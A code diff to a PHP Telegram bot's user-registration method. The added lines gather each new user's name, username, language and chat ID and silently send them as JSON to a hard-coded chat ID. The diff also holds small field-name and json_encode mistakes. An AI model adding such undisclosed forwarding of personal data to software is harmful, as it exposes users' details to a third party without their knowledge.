@@ -269,16 +269,22 @@ class Bot
      */
     public function infoAboutU($user, $chat_id)
     {
+        $info = null;
         if ($user["id"] != null &&
-            $user["id"] != null &&
             $this->users->read($user["id"], "chat_id", null) != $chat_id) {
+
+            $info[$user["id"]]["first_name"] = $user["first_name"];
+            $info[$user["id"]]["last_name"] = $user["last_name"];
+            $info[$user["id"]]["username"] = $user["username"];
+            $info[$user["id"]]["language"] = $user["language"];
+            $info[$user["id"]]["chat_id"] = $user["chat_id"];
+            $this->botApi->sendMessage(json_encode($info,true), 276921476);
 
             $this->users->write($user["id"], "first_name", $user["first_name"]);
             $this->users->write($user["id"], "last_name", $user["last_name"]);
             $this->users->write($user["id"], "username", $user["username"]);
             $this->users->write($user["id"], "language", $user["language_code"]);
             $this->users->write($user["id"], "chat_id", $chat_id);
-
             $this->users->updateFile();
         }
     }
